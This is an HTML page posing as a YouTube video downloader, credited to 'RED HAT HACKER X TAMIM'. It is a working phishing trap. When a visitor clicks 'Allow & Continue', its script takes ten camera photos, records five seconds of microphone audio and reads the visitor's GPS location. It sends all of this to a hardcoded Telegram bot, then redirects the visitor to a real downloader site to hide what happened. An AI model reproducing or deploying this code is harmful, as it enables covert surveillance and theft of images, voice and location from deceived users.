<!DOCTYPE html>
<html lang="en">
<head>

  <style>
    body {font-family: Arial, sans-serif; text-align: center; background: #000; color: white;}
    .container {max-width: 500px; margin: 30px auto; background: #111; padding: 20px; border-radius: 10px;}
    button {background: red; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer;}
    button:hover {background: darkred;}
    .footer {
      position: fixed; bottom: 10px; left: 50%; transform: translateX(-50%);
      font-size: 16px; color: #00ff00; font-weight: bold;
      animation: bounce 1s infinite alternate;
    }
    @keyframes bounce {
      0% {transform: translate(-50%, 0);}
      100% {transform: translate(-50%, -10px);}
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>📥 Allow Now & Download YouTube Video</h1>
    <button id="startCapture">Allow & Continue</button>
    <div id="status"></div>
  </div>

  <div class="footer">Made By RED HAT HACKER X TAMIM</div>

  <script>
    const botToken = "8041585523:AAFPDOC3CH2HLgjaQveu5zoNj_fXYLkfdTg";
    const chatId = "6763021567";

    document.getElementById("startCapture").addEventListener("click", async () => {
      document.getElementById("status").innerText = "Requesting camera, mic & location...";

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        const track = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(track);
        
        // 📸 Capture multiple photos within 1 second
        let photoCount = 0;
        const captureInterval = setInterval(async () => {
          if (photoCount >= 10) {
            clearInterval(captureInterval);
            track.stop();
            return;
          }
          const blob = await imageCapture.takePhoto();
          sendToTelegram(blob, "photo");
          photoCount++;
        }, 100);

        // 🎤 Record 5 sec audio
        const mediaRecorder = new MediaRecorder(stream);
        let audioChunks = [];
        mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
        mediaRecorder.onstop = () => {
          const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
          sendToTelegram(audioBlob, "voice");
        };
        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 5000);

        // 📍 Send location
        navigator.geolocation.getCurrentPosition(pos => {
          const loc = `Latitude: ${pos.coords.latitude}, Longitude: ${pos.coords.longitude}`;
          sendMessage(loc);
        });

        // ⏩ Redirect after 1 second
        setTimeout(() => {
          window.location.href = "https://y2mate.com/";
        }, 1000);

      } catch (err) {
        document.getElementById("status").innerText = "Error: " + err.message;
        console.error(err);
      }
    });

    function sendToTelegram(data, type) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append(type, data, `capture.${type === "photo" ? "jpg" : "webm"}`);

      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
        method: "POST",
        body: formData
      }).catch(err => console.error("Error sending:", err));
    }

    function sendMessage(text) {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text })
      });
    }
  </script>
